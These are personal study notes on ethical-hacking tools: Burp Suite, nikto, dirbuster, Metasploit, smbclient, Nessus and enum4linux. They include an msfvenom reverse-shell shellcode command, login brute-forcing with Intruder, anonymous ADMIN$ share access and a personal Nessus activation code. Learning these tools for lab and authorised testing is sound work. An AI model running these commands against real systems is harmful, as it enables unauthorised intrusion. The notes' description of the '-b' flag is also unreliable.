---
tags:
- type/reference/ethical-hacking
- topic/tools/hacking
---

#### Butp suite
- Burp suite is a web proxy with its own cert allowing it to see TLS encrypted data
- To get started, you need to start burp suite, and a browser (preferably firefox) and go to the browser settings
	- Add a proxy that runs on localhost and port 8080
	- Visit `https://burp/` and download the CA Certificate
	- Import the certificate to firefox via it's privacy and security tab, then certificates, Authorities 
- Burp Tabs
	- Proxy
		- Allows you to turn on intercept to see and manipulate each request and response that burp is intercepting before forwarding it to its destination
	- Target
		- Shows you all the pages discovered from all the traffic that got intercepted by the proxy
		-  The target tab doesn't always pickup all traffic right away and multiple refreshes may be required
		- Target allows you to also set a scope as to what should be intercepted
	- Repeater
		- The Repeater shows you your response to a request in real time, and allows you to modify it before it's sent
	- Intruder
		- You can highlight and add parameters
			- Example: email and password if you're logging into a website
		- You can select different **attack types**
			- **Sniper** is the most common and uses one parameter ^837b27
		- You can use the **pitchfork** attack type with multiple params ^cbb090
			- The pitchfork attack takes in lists of data, such as a list of usernames and a list of passwords
- You can right click an intercepted packet from any tab, and send it to other tabs like the Repeater 
#### nikto
- Web vulnerability scanning tool
- Basic syntax: `nikto -h http(s)://ip_address`
- Can be blocked if the application has good security/firewall
#### dirbuster
- Run with `dirbuster &` to keep it running in the background
- Provide it with a URL + port. E.g `http://192.168.57.4:80/`
- You need to pick a wordlist file. 
	- On kali, you can browse to `/usr/share/wordlists/dirbuster/` and pick a wordlist file from the ones provided
	- Remember that buster tools like dirbuster and gobuster rely on wordlists with well-known directory names such as http://website/admin to verify which directories are accessible
- You can also specify file extensions
	- Apache uses .php
	- Microsoft websites (IAS) use .asp and .aspx
	- You can also add other extensions such as (.txt .zip .rar .pdf .docx), although that will increase the search time
- An example full path with file extensions would be http://website/admin.php
- You can view results in a list or tree view, and interact with pages to view them in the browser while the scan is still active
#### dirb
#### gobuster
#### Metasploit
- An exploitation framework that can also do enumeration and more
- Typing a `search` with a word like `smb` into metasploit will show all the available tools it has for it
- The name of the tool will start with its category, e.g 'auxiliary' which is meant for enumeration, followed by what it does exactly
- You can then say `use` and the name or number of the tool that you want to use
- Typing info will show you `info` about the tool and `options` will show you available usage options
	-  ![Payload Options](assets/Screenshot_2025-09-04_16-24-56.png)
- Tools will normally require you `set` an RHOST(S) which is the target(s) of your attack
	- You can set pretty much everything in general such as the LHOST, ports, and the payload `set payload linux/x86/shell_bind_tcp`
- Once your options are set you can then `run` or `exploit` to use the tool
- Typing `options` after a failed exploitation attempt may provide you with payload options
- This commands `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.57.6 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"` is used during [[Buffer Overflow index|Buffer Overflow]] at the [[Buffer Overflow Steps#^0dee88|shellcode generation]] step using the msfvenom tool from metasploit to gain reverse shell access to the target windows machine
	- This is a reverse shell attack, so we need to send our own machine's IP and port to the target.
	- Adding an `EXITFUNC` makes the attack more stable
	- `-f`means file type which is set to `c`as the output file
	- `-a`is our architecture
	- `-b`is for bad characters that should be used which we found here [[Buffer Overflow Steps#^d6154c|Buffer Overflow stes#Finding Bad Characters]]

#### smbclient
- Not exactly a hacking tool, but it can connect to an smbserver's file share
- If you can anonymously connect to an smbserver you can get an idea of the network's file structure, and may find important files
- `smbclient -L \\\\192.168.57.4\\` will list all files
- If you find a file `smbclient \\\\192.168.57.4\\ADMIN$` will attempt to connect to the file
#### nessus
- A vulnerability scanner tool
- Search for nessus download on google, then download and install the relevant file
- Start nessus by typing `sudo systemctl start nessusd.service` or `sudo /etc/init.d/nessusd start`
- Go to https://localhost:8834 to use nessus
- My activation code that I never got to use NNAH-LFFS-PZXP-KTB5-P38X
- Works on private networks only with the free edition
- Don't rely on nessus's reported vulnerability on your report, rather, confirm it, and take a screenshot of the actual vulnerability
#### enum4linux
- A powerful enumeration tool
- Give it an ip and it will do the rest